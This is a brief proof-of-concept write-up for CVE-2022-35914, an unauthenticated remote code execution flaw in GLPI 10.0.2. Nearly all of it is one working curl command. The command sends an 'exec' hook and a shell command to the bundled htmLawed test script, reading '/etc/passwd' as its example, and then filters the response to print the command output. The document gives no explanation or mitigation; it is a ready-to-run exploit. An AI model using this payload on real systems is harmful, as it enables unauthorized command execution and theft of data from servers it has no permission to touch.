# CVE-2022-35914
Unauthenticated RCE in GLPI 10.0.2

# PoC

```
curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://{{HOST}}/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
```
